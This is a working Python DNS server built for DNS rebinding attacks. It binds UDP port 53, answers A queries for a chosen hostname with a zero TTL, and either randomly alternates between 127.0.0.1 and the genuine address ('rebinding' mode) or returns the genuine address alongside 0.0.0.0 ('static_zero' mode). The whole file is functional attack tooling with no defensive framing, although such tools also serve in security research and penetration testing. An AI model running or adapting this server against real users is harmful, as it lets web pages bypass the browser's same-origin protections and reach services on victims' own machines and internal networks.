import argparse
import ipaddress
import os
import socket
import struct
import sys


A_TYPE = 1
SUPPORTED_TYPES = [A_TYPE]
IN_CLASS = 1


def hostname_to_dns_repr(hostname):
    def label_to_dns_repr(label):
        label = label.encode()
        return bytes([len(label)]) + label

    return b''.join(label_to_dns_repr(label) for label in hostname.split('.'))


def pack_ttl_with_data(ttl, data):
    return b''.join([
        struct.pack('>IH', ttl, len(data)),
        data,
    ])


def pack_a_answer(query, ips):
    return b''.join([
        query + pack_ttl_with_data(0, ipaddress.IPv4Address(ip).packed)
        for ip in ips
    ])


def to_expected_query(hostname, tp):
    return hostname + struct.pack('>HH', tp, IN_CLASS)


if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('hostname')
    p.add_argument('--mode', required=True, choices=('rebinding', 'static_zero'))
    args = p.parse_args()

    assert args.hostname.count('.') == 3 and args.hostname.endswith('.'), 'Invalid hostname'
    expected_hostname = hostname_to_dns_repr(args.hostname)
    fake_addr = socket.gethostbyname(args.hostname[args.hostname.index('.') + 1:])

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', 53))

    while True:
        packet, client_addr = sock.recvfrom(512)
        print(f'Got a packet from {client_addr}')

        header_len = 12
        header_fmt = '>' + 'H'*6
        if len(packet) < header_len:
            print(f'Dropping the packet because it it too short ({len(packet)} bytes)', file=sys.stderr)
            continue

        header = packet[:header_len]
        transaction_id, flags, query_count, *_ = struct.unpack(header_fmt, header)

        if query_count != 1:
            print(f'Dropping the packet because it has more than one query', file=sys.stderr)
            continue

        query = packet[header_len:header_len + len(expected_hostname) + 4]
        query_type = next((
            tp
            for tp in SUPPORTED_TYPES
            if query.lower() == to_expected_query(expected_hostname, tp)
        ), None)

        answer_count = 0
        answer = b''

        expected_query = to_expected_query(expected_hostname, query_type) if query_type is not None else None
        if query_type == A_TYPE:
            if args.mode == 'rebinding':
                ips = ['127.0.0.1' if os.urandom(1)[0] % 4 == 0 else fake_addr]
            elif args.mode == 'static_zero':
                ips = [fake_addr, '0.0.0.0']
            else:
                raise Exception(f'Unsupported mode: {args.mode}')

            answer_count = len(ips)
            answer = pack_a_answer(expected_query, ips)

            print(f'Responded with {ips} to an A query')
        else:
            print(f'Sending an empty response to unsupported query: {query}')

        # Indicate that this message is a response and copy the "recursion desired" bit from the query.
        # Also indicate this is an authoritative response.
        # Zero out everything else (in particular, unset the "recursion available" bit).
        answer_flags = 0b1000_0100_0000_0000 | (flags & 0b0000_0001_0000_0000)
        response_header = struct.pack(header_fmt, transaction_id, answer_flags, query_count, answer_count, 0, 0)
        response = b''.join([response_header, query, answer])
        sock.sendto(response, client_addr)